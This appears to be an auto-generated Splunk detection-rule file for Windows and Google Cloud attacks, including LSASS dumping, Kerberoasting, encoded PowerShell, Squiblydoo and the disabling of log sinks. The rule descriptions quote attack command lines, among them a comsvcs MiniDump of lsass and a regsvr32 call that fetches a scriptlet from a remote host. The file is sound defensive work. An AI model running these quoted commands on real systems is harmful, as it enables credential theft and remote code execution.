# Generated by scripts/convert_rules.py from rules/sigma/. Do not edit by hand.
[default]
dispatch.earliest_time = -30d
dispatch.latest_time = now

[GCP Lab Secret Read by Unexpected Principal]
description = Detects the value of a Purple Loop lab secret (domain admin and DSRM passwords) being \
read by anyone other than the lab VMs' own service account. Only the VMs need these \
values, at boot, so a read by a person or any other identity is either an admin \
break-glass action or credential theft. This is an environment-specific allow-list \
rule: adapt the secret name prefix and the expected workload identity to your own \
secrets. Requires Data Access audit logs for Secret Manager (infra/terraform/audit.tf).
search = sourcetype="google:gcp:pubsub:message" data.protoPayload.methodName="google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion" data.protoPayload.resourceName="*/secrets/purple-loop-*" NOT (data.protoPayload.authenticationInfo.principalEmail="purple-loop-vm@*" data.protoPayload.authenticationInfo.principalEmail="*.iam.gserviceaccount.com")

[LSASS Opened With Credential Dumping Access Rights]
description = Detects a process opening a handle to lsass.exe with access rights that allow reading \
its memory (PROCESS_VM_READ combined with query rights, or full access). LSASS holds \
credential material for logged-on users, so tools like Mimikatz (sekurlsa::logonpasswords, \
0x1010), comsvcs.dll MiniDump (0x1fffff) and ProcDump open it this way before dumping. \
Normal Windows components touch LSASS constantly, but almost always with low rights such \
as 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION), which this rule deliberately ignores.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10 TargetImage="*\\lsass.exe" GrantedAccess IN ("0x1010", "0x1410", "0x1418", "0x1438", "0x143a", "0x1fffff", "0x1f0fff", "0x1f1fff", "0x1f2fff", "0x1f3fff") NOT (SourceImage IN ("C:\\Windows\\System32\\wininit.exe", "C:\\Windows\\System32\\csrss.exe", "C:\\Windows\\System32\\lsm.exe") OR (SourceImage="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*" SourceImage="*\\MsMpEng.exe") OR SourceImage IN ("C:\\Program Files\\Google\\Cloud Operations\\Ops Agent\\bin\\google-cloud-metrics-agent_windows_amd64.exe", "C:\\Program Files\\Google\\Compute Engine\\agent\\GuestTelemetryExtension\\GuestTelemetry.exe"))

[Process Memory Dump Via Comsvcs.dll MiniDump]
description = Detects the "living off the land" LSASS dumping technique that calls the MiniDump export \
of the built-in comsvcs.dll, usually as \
"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass PID> <out file> full". \
No attacker tool needs to touch disk, which makes it popular with ransomware operators. \
The export can also be called by its ordinal (#24), so the rule matches both forms and does \
not require the image to be rundll32.exe, which catches renamed copies too.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 CommandLine="*comsvcs*" CommandLine IN ("*MiniDump*", "*#24*", "*#+24*", "*#-4294967272*")

[Kerberoasting - Service Ticket Requested With RC4 Encryption]
description = Detects a successful Kerberos service ticket request (event 4769 on a domain controller) \
that used RC4-HMAC encryption (0x17) for a user service account. In Kerberoasting, an \
attacker requests tickets for accounts with SPNs and cracks them offline; tools like Rubeus \
ask for RC4 because it is far faster to crack than AES. Modern domains negotiate AES \
(0x11/0x12) by default, so RC4 tickets for user accounts stand out. \
Machine accounts (ending in $) and krbtgt are excluded because their keys are random and \
not practically crackable, so they are not Kerberoasting targets. \
Detecting volume (many SPNs from one account in a short window) needs correlation; see the \
native YARA-L rule rules/yara_l/kerberoasting_burst.yaral.
search = source="WinEventLog:Security" EventCode=4769 TicketEncryptionType="0x17" Status="0x0" NOT (ServiceName IN ("*$", "krbtgt"))

[GCP Firewall Rule Opened to the Internet]
description = Detects a VPC firewall rule being created or changed so that it accepts traffic from \
any address (0.0.0.0/0 or ::/0). Opening a port to the whole internet exposes \
services such as RDP, SSH or databases to scanning and brute force, and attackers \
do it to reach a host they control or to weaken a network boundary. Compute Engine \
logs two entries per change; only the first (operation.first) carries the request, \
so that is the one this rule matches.
search = sourcetype="google:gcp:pubsub:message" data.protoPayload.methodName IN ("*.compute.firewalls.insert", "*.compute.firewalls.patch", "*.compute.firewalls.update") "data.protoPayload.request.sourceRanges{}" IN ("*0.0.0.0/0*", "*::/0*")

[GCP Log Sink Deleted or Disabled]
description = Detects a Cloud Logging sink being deleted, or updated to disabled. Sinks copy logs to \
a SIEM, a BigQuery dataset or long-term storage; removing or disabling one silently \
stops that copy, which is how an attacker blinds the security team before acting. \
Ordinary sink edits (for example Terraform changing the filter) are deliberately not \
matched, because they are routine and look the same whoever makes them; unusual \
editors of logging configuration are a better job for a hunt.
search = sourcetype="google:gcp:pubsub:message" data.protoPayload.methodName="google.logging.v2.ConfigServiceV2.DeleteSink" OR (data.protoPayload.methodName="google.logging.v2.ConfigServiceV2.UpdateSink" data.protoPayload.request.sink.disabled=true)

[Hidden PowerShell Window With Encoded Command]
description = Detects PowerShell started with both a hidden window and a Base64-encoded command, the \
combination used by Empire, Cobalt Strike and many droppers ("powershell -noP -sta -w 1 \
-enc <base64>"). Each flag alone has legitimate uses (management tools hide windows, \
some installers encode commands), so requiring both keeps noise low. \
The windash modifier also matches the same flags written with "/" or other dash characters. \
The rule matches the binary by OriginalFileName too, so a renamed powershell.exe is caught.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image IN ("*\\powershell.exe", "*\\pwsh.exe") OR OriginalFileName IN ("PowerShell.EXE", "pwsh.dll") CommandLine="* -e *" OR CommandLine="* /e *" OR CommandLine="* –e *" OR CommandLine="* —e *" OR CommandLine="* ―e *" OR CommandLine="* -en *" OR CommandLine="* /en *" OR CommandLine="* –en *" OR CommandLine="* —en *" OR CommandLine="* ―en *" OR CommandLine="* -enc *" OR CommandLine="* /enc *" OR CommandLine="* –enc *" OR CommandLine="* —enc *" OR CommandLine="* ―enc *" OR CommandLine="* -enco*" OR CommandLine="* /enco*" OR CommandLine="* –enco*" OR CommandLine="* —enco*" OR CommandLine="* ―enco*" OR CommandLine="* -ec *" OR CommandLine="* /ec *" OR CommandLine="* –ec *" OR CommandLine="* —ec *" OR CommandLine="* ―ec *" CommandLine="* -w 1 *" OR CommandLine="* /w 1 *" OR CommandLine="* –w 1 *" OR CommandLine="* —w 1 *" OR CommandLine="* ―w 1 *" OR CommandLine="* -w h*" OR CommandLine="* /w h*" OR CommandLine="* –w h*" OR CommandLine="* —w h*" OR CommandLine="* ―w h*" OR CommandLine="* -win h*" OR CommandLine="* /win h*" OR CommandLine="* –win h*" OR CommandLine="* —win h*" OR CommandLine="* ―win h*" OR CommandLine="* -window h*" OR CommandLine="* /window h*" OR CommandLine="* –window h*" OR CommandLine="* —window h*" OR CommandLine="* ―window h*" OR CommandLine="* -windowstyle h*" OR CommandLine="* /windowstyle h*" OR CommandLine="* –windowstyle h*" OR CommandLine="* —windowstyle h*" OR CommandLine="* ―windowstyle h*"

[Service Installed With Command Shell Or Script In Image Path]
description = Detects a new Windows service (System event 7045) whose ImagePath runs a command shell, \
PowerShell or another LOLBin instead of a service executable. PsExec-style lateral movement \
from Empire, Impacket smbexec/psexec and Metasploit creates a temporary service over SMB \
(the svcctl named pipe on ADMIN$/IPC$) with a payload such as \
"%COMSPEC% /C start /b powershell -enc ...". Real services point at an .exe or a svchost \
group. Sysinternals PsExec installs PSEXESVC.exe, which this rule intentionally ignores. \
The event is logged on the target host. T1569.002 is the primary technique; T1021.002 is \
tagged because remote service creation is how SMB lateral movement executes code.
search = source="WinEventLog:System" Provider_Name="Service Control Manager" EventCode=7045 ImagePath IN ("*%COMSPEC%*", "*cmd /c*", "*cmd.exe /c*", "*powershell*", "*pwsh*", "*mshta*", "*rundll32*", "*regsvr32*", "*wscript*", "*cscript*", "*\\\\127.0.0.1\\*", "*\\Users\\Public\\*", "*\\Windows\\Temp\\*")

[GCP Owner or Editor Role Granted]
description = Detects an IAM policy change that ADDS the basic Owner or Editor role to any member. \
These roles give near-total control of a project, so granting them is a classic \
way to escalate privilege or keep access. The rule reads the policy delta \
(serviceData.policyDelta.bindingDeltas), not the request: SetIamPolicy logs the whole \
policy, and almost every project's policy already contains Editor (the default \
compute service account), so matching the request would fire on every IAM change. \
Removals are ignored.
search = sourcetype="google:gcp:pubsub:message" data.protoPayload.methodName="SetIamPolicy" "data.protoPayload.serviceData.policyDelta.bindingDeltas{}.action"="*ADD*" "data.protoPayload.serviceData.policyDelta.bindingDeltas{}.role" IN ("*roles/owner*", "*roles/editor*") NOT (data.protoPayload.authenticationInfo.principalEmail="service-agent-manager@system.gserviceaccount.com" "data.protoPayload.serviceData.policyDelta.bindingDeltas{}.member"="*-compute@developer.gserviceaccount.com*")

[GCP Service Account Key Created]
description = Detects creation or upload of a user-managed key for a Google Cloud service account. \
A key is a long-lived credential that works from anywhere, outside the identity \
controls that protect people (MFA, session length). Attackers who gain IAM access \
create one to keep access after their original foothold is removed. Google \
recommends avoiding keys entirely (workload identity, impersonation), so in most \
environments every new key deserves a look.
search = sourcetype="google:gcp:pubsub:message" data.protoPayload.methodName IN ("google.iam.admin.v1.CreateServiceAccountKey", "google.iam.admin.v1.UploadServiceAccountKey")

[Scheduled Task Created With Suspicious Action Via Schtasks]
description = Detects schtasks.exe creating a task whose action (/TR) launches a script interpreter or \
LOLBin, decodes Base64, or runs from a user-writable folder. Attackers use scheduled tasks \
for persistence and for running payloads as SYSTEM. Legitimate tasks are mostly created by \
installers or Group Policy and point at signed binaries under Program Files or System32. \
This is the command-line half of a pair; the Security-log half (event 4698) catches tasks \
created through the API or PowerShell cmdlets, which never start schtasks.exe.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\schtasks.exe" OR OriginalFileName="schtasks.exe" CommandLine="* -create *" OR CommandLine="* /create *" OR CommandLine="* –create *" OR CommandLine="* —create *" OR CommandLine="* ―create *" CommandLine IN ("*powershell*", "*pwsh*", "*mshta*", "*rundll32*", "*regsvr32*", "*wscript*", "*cscript*", "*FromBase64String*", "*\\AppData\\*", "*\\Users\\Public\\*", "*\\Windows\\Temp\\*")

[Run Key Set To Launch Script Interpreter Or LOLBin]
description = Detects a value being written under a Run or RunOnce key (programs started at logon) when \
the value launches a script interpreter or LOLBin, decodes Base64, contains a URL, or runs \
from a user-writable folder. Plenty of legitimate software adds Run keys (OneDrive, Teams, \
security agents), but they point at their own signed executable, not at powershell.exe. \
The key paths end in a backslash on purpose, so similar keys such as \
"...\SecureTimeLimits\RunTime\..." do not match.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=13 TargetObject IN ("*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*", "*\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*", "*\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\*") Details IN ("*powershell*", "*pwsh*", "*mshta*", "*rundll32*", "*regsvr32*", "*wscript*", "*cscript*", "*cmd.exe /c*", "*cmd /c*", "*FromBase64String*", "*http://*", "*https://*", "*\\Users\\Public\\*", "*\\AppData\\Local\\Temp\\*", "*\\Windows\\Temp\\*")

[Scheduled Task Registered With Suspicious Action]
description = Detects Security event 4698 (a scheduled task was created) where the task's XML definition \
runs a script interpreter or LOLBin, decodes Base64, or launches from a user-writable folder. \
Unlike the schtasks.exe rule, this sees every creation method (schtasks, the COM API, \
Register-ScheduledTask, remote creation over RPC) because Windows logs the task itself. \
Requires "Audit Other Object Access Events" to be enabled.
search = source="WinEventLog:Security" EventCode=4698 TaskContent IN ("*powershell*", "*pwsh*", "*mshta*", "*rundll32*", "*regsvr32*", "*wscript*", "*cscript*", "*FromBase64String*", "*\\AppData\\*", "*\\Users\\Public\\*", "*\\Windows\\Temp\\*")

[Mshta Executing Inline Script Or Remote Content]
description = Detects mshta.exe running script directly from its command line (vbscript: or javascript: \
protocol handlers) or fetching content from a URL. mshta.exe is a Microsoft-signed binary \
that executes HTML Applications, so attackers use it to run script while appearing as a \
trusted process (signed binary proxy execution). Legitimate use, when it exists at all, opens \
a local .hta file from an installer or Program Files.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\mshta.exe" OR OriginalFileName="MSHTA.EXE" CommandLine IN ("*vbscript:*", "*javascript:*", "*http://*", "*https://*")

[Regsvr32 Loading Scriptlet Via Scrobj.dll (Squiblydoo)]
description = Detects regsvr32.exe called with the /i: switch together with scrobj.dll, a .sct scriptlet, \
or a URL, e.g. "regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll". This "Squiblydoo" \
technique makes the signed regsvr32.exe download and run a COM scriptlet, bypassing \
application allow-listing. Normal regsvr32 use registers a local DLL and does not combine \
/i: with scrobj.dll or a remote location.
search = source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\regsvr32.exe" OR OriginalFileName="REGSVR32.EXE" CommandLine="* -i:*" OR CommandLine="* /i:*" OR CommandLine="* –i:*" OR CommandLine="* —i:*" OR CommandLine="* ―i:*" CommandLine IN ("*scrobj*", "*.sct*", "*http://*", "*https://*", "*ftp://*")
